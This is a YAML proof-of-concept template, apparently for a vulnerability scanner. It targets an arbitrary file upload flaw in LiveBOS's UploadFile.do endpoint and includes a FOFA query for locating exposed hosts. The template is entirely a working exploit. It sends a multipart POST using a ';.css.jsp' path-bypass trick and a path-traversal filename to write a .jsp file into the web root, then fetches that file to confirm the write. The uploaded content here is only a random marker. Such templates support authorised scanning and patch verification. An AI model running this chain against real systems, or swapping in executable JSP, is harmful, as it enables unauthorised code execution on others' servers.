id: poc-yaml-livebos-uploadfile-do-anyfile-upload
info:
  name: LiveBOS UploadFile.do 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: livebos
  fofa: body="LiveBos"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /feed/UploadFile.do;.css.jsp
  headers:
    Content-Type: multipart/form-data;boundary=--------------------------688644671867822357584225
  data: '----------------------------688644671867822357584225

    Content-Disposition: form-data; name="NewFile"; filename="/../../../../{{.t1}}.jsp"

    Content-Type: text/plain


    {{.t2}}

    ----------------------------688644671867822357584225—-'
  expression: status_code == 200 && contains(body,".jsp")
- method: GET
  path: /{{.t1}}.jsp;.js.jsp
  expression: status_code == 200 && body == t2
transport: http
